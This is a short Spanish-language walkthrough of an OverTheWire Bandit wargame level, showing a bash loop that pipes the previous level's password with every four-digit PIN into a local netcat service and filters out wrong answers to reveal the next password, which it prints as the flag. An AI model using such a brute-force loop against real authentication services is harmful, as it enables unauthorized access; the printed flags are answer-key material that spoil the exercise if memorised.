## Level 24 → Level 25

### Problema

### Solición

```bash
bandit24@bandit:~$  nc localhost 30002 
bandit24@bandit:~$ for i in {0000..9999}; do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done | nc localhost 30002 | grep -v Wrong
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d

Exiting.
bandit24@bandit:~$
```

### Notas

Entramos puerto 30002 dónde nos pasaran la contraseña pero para esto ocupamos realizar un script para que cuando entremos al puerto le mande la contraseña del bandit anterior y un numero de autenticacion ejmplo:

VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0001
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0002

…
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 9998
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 9999

Esto para que el escucha nos pueda entregar la contraseña

El comando grep -v hace que no aparezaca todas las respuesta por parte del escucha donde tenga la palabra Wrong

### CTF

p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d